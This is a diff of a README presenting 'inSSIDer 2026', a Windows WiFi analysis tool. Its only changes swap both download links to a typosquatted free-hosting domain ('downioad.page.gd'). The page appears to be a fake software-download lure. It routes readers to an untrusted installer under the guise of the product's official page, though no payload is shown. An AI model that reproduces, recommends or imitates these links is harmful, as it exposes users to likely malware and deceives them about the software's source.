@@ -2,7 +2,7 @@
 
 inSSIDer is a powerful WiFi network analysis tool designed for Windows 10 and 11. It helps users visualize and optimize their wireless networks by providing detailed insights into signal strength, channel interference, and network performance. Whether you're a home user or IT professional, inSSIDer 2026 offers a comprehensive suite of features to enhance your WiFi experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What is inSSIDer?
 
@@ -59,7 +59,7 @@ inSSIDer stands out for its accuracy, ease of use, and detailed reporting capabi
 
 For the latest version of inSSIDer 2026, please visit our download page:
 
-[Get inSSIDer 2026 Now](https://download-page.page.gd/)
+[Get inSSIDer 2026 Now](https://downioad.page.gd/)
 
 ## Last Updated
 
